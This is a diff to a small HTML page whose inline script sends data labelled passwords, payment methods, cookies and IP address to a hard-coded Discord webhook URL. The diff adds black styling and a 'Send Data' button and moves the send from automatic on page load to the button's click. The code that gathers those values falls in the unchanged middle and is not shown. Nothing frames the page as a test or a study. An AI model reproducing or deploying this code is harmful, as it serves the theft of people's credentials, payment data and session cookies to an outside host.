@@ -3,8 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <title>Document</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+        }
+    </style>
 </head>
 <body>
+    <button id="send-data">Send Data</button>
     <script>
         // Replace with your Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1437409358177763338/tqPgOTbwLvhNBhABDntVi1OhfKMld6mc_k8nG9ZNO6fD09rRBlnGU6RuONKbzI9FVzRb';
@@ -50,12 +57,14 @@
             });
         }
 
-        // Send data to Discord webhook
-        sendData({
-            passwords: passwords,
-            paymentMethods: paymentMethods,
-            cookies: cookies,
-            ip: ip
+        // Add event listener to the button
+        document.getElementById('send-data').addEventListener('click', () => {
+            sendData({
+                passwords: passwords,
+                paymentMethods: paymentMethods,
+                cookies: cookies,
+                ip: ip
+            });
         });
     </script>
 </body>
